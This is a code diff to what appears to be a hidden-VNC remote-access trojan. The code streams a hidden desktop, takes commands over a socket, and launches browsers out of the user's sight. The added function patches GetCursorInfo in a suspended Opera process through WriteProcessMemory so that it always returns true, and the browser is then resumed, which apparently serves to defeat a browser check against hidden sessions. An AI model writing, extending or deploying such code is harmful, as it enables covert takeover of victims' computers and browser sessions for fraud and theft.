@@ -597,6 +597,64 @@ static void kill_process_by_name(const wstring& exeName) {
     CloseHandle(hSnap);
 }
 
+static bool patch_cursor_info(HANDLE hProc) {
+    void* addr = nullptr;
+    HMODULE hLocalUser32 = GetModuleHandleW(L"user32.dll");
+    if (hLocalUser32) {
+        void* localProc = (void*)GetProcAddress(hLocalUser32, "GetCursorInfo");
+        if (localProc) {
+            DWORD_PTR offset = (DWORD_PTR)localProc - (DWORD_PTR)hLocalUser32;
+
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProc));
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                MODULEENTRY32W me32{};
+                me32.dwSize = sizeof(me32);
+                if (Module32FirstW(hSnap, &me32)) {
+                    do {
+                        if (_wcsicmp(me32.szModule, L"user32.dll") == 0) {
+                            addr = (void*)((DWORD_PTR)me32.modBaseAddr + offset);
+                            break;
+                        }
+                    } while (Module32NextW(hSnap, &me32));
+                }
+                CloseHandle(hSnap);
+            }
+            if (!addr) {
+                addr = localProc;
+            }
+        }
+    }
+    if (!addr) return false;
+
+    bool is64 = true;
+    BOOL isWow64 = FALSE;
+    if (IsWow64Process(hProc, &isWow64)) {
+        if (isWow64) {
+            is64 = false;
+        } else {
+#if !defined(_WIN64)
+            is64 = false;
+#endif
+        }
+    }
+
+    vector<unsigned char> patch;
+    if (is64) {
+        patch = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
+    } else {
+        patch = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00 };
+    }
+
+    DWORD oldProt;
+    if (!VirtualProtectEx(hProc, addr, patch.size(), PAGE_EXECUTE_READWRITE, &oldProt)) {
+        return false;
+    }
+    SIZE_T written = 0;
+    bool ok = WriteProcessMemory(hProc, addr, patch.data(), patch.size(), &written);
+    VirtualProtectEx(hProc, addr, patch.size(), oldProt, &oldProt);
+    return ok && written == patch.size();
+}
+
 // -----------------------------------------------------------------------
 //  Encode Worker Thread (Capture Queue -> JPEG Queue)
 // -----------------------------------------------------------------------
@@ -753,6 +811,18 @@ static void send_worker() {
 }
 
 // -----------------------------------------------------------------------
+struct DesktopEnumParam {
+    vector<HWND>* list;
+};
+
+static BOOL CALLBACK DesktopEnumCallback(HWND hwnd, LPARAM lParam) {
+    auto p = reinterpret_cast<DesktopEnumParam*>(lParam);
+    if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+        p->list->push_back(hwnd);
+    }
+    return TRUE;
+}
+
 //  Capture Loop (Producer)
 // -----------------------------------------------------------------------
 static void capture_loop() {
@@ -825,17 +895,8 @@ static void capture_loop() {
         DWORD enumInterval = staticFrames > 30 ? 1000 : 350;
         if (windows.empty() || forceFullFrame || now - lastWindowEnum >= enumInterval) {
             windows.clear();
-            struct EnumParam {
-                vector<HWND>* list;
-            } param = { &windows };
-            auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
-                auto p = reinterpret_cast<EnumParam*>(lParam);
-                if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
-                    p->list->push_back(hwnd);
-                }
-                return TRUE;
-            };
-            EnumDesktopWindows(g_hHiddenDesktop, EnumCallback, reinterpret_cast<LPARAM>(&param));
+            DesktopEnumParam param = { &windows };
+            EnumDesktopWindows(g_hHiddenDesktop, DesktopEnumCallback, reinterpret_cast<LPARAM>(&param));
             reverse(windows.begin(), windows.end());
             lastWindowEnum = now;
         }
@@ -2050,7 +2111,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
+                                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+                        if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                            patch_cursor_info(pi.hProcess);
+                        }
+                        ResumeThread(pi.hThread);
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
